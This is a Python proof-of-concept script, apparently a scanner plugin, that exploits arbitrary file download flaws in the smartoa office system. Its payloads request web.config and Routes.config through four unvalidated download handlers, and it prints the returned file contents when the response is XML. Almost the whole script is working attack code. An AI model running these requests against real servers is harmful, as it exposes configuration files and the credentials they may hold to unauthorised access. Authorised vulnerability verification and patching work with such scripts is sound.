#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: smartoa 多处任意文件下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-060613
author: Lucifer
description: smartoa系统中,EmailDownload.ashx的url参数,UDFDownLoad.ashx的path参数,DownLoad.ashx的path参数,MyDownLoad的path参数均未经过
    校验，导致任意文件下载，可获取敏感信息
'''
import sys
import requests
import warnings
from termcolor import cprint

class smartoa_multi_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        try:
            noexist = True
            for payload in [r"/file/EmailDownload.ashx?url=~/web.config&name=web.config", r"/file/UDFDownLoad.ashx?path=~/web.config&name=web.config",
                            r"/file/DownLoad.ashx?path=~/Routes.config", r"/file/MyDownLoad.ashx?path=~/Routes.config"]:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, timeout=10, verify=False)
                if req.headers["Content-Type"] == "application/xml":
                    cprint("[+]存在smartoa任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
                    return True, vulnurl, "smartoa 多处任意文件下载漏洞", str(payload), req.text
            if noexist:
                cprint("[-]不存在smartoa_multi_filedownload漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = smartoa_multi_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()